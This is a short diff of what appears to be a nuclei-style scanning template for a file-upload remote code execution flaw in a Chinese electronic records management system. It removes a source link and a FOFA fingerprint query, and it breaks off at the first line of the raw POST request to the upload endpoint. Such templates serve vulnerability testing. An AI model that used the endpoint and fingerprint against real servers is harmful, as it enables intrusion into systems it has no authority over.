@@ -3,12 +3,8 @@ info:
   name: 电子资料管理系统 ImageUpload.ashx 文件上传致RCE漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/haip83q1y1xf5e89'
+  description: ''
   tags: rce,file-upload,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: haip83q1y1xf5e89
-    fofa: body="Menu/Login/ThirdLoginHandler.ashx"
 http:
 - raw:
   - 'POST /Menu/ImageManger/ImageUpload.ashx HTTP/1.1
